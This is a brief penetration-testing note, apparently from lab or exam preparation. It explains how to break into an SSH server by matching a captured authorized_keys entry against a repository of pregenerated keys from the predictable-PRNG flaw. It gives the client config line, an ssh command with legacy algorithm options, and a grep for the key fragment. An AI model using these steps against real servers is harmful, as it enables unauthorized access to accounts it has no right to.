# SSH 
---
If we ever get authorized_keys for a pc, download this repo from github:
https://gitbook.brainyou.stream/basic-linux/ssh-key-predictable-prng-authorized_keys-process

if the authorized_key is a ssh-dss, add this to /etc/ssh/ssh_config
```txt
PubkeyAcceptedKeyTypes +ssh-dss
```

Alternatively we can specify the public key while doing ssh into the server with the -o switch:
```bash
ssh -p 22 -i id_rsa -oKexAlgorithms=+diffie-hellman-group1-sha1 -o 'PubkeyAcceptedKeyTypes +ssh-dss' bob@10.11.1.136
```

Now go into the repo /dsa/1024
Grep for the first 30 or so characters of the retrieved authorized_keys:

```bash
grep -lr 'AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9'
```

Find the exact match for private key and use the private key to log into the server.
